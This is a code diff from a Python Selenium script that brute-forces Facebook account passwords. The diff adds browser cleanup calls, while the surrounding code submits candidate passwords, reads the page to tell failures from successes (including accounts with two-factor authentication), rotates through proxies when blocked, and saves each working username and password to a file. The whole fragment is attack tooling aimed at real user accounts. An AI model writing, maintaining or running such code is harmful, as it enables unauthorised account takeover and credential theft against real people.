@@ -432,11 +432,12 @@ def main():
                   page_content = bs(driver.page_source, 'html.parser').text
                   if "incorrect" in page_content:
                     print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
-                  
+                    driver.quit()
                 except selenium.common.exceptions.TimeoutException as sel_timer:
                   page_now = bs(driver.page_source, 'html.parser').text
                   if "Find your account" in page_now:
                     print(f'{red}Couldn\'t find the account {username_email}{plain}')
+                    driver.quit()
                     break
                   if "Check your notifications on  another device" in page_content:
                     print(f'{yellow}Correct password {check_password} [ might have 2 factor authentication {plain}]', flush = True)
@@ -445,22 +446,25 @@ def main():
                     break
                   if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information':
                     print(f'{yellow} {check_password} is the correct password{plain}')
+                    driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                   else:
                     logging.critical(sel_timer)
                     print(f'{red}Await response timeout{plain}')
+                    driver.quit()
                     pass
                     
                 except selenium.common.exceptions.NoSuchElementException as sel_err:
                   logging.error(sel_err)
                   print(f'{red}Kindly inform the developer of this error, once spotted{plain}')
-
+                  driver.quit()
               else:
                 print(f'{red}Requests have been temporarily blocked{plain}')
-               
+                driver.quit()
             except Exception:
               track = traceback.format_exc()
               proxy_errorV(errorLogged = track, terminate = caught_proxy)
+              driver.quit()
               break
             
           driver.quit()
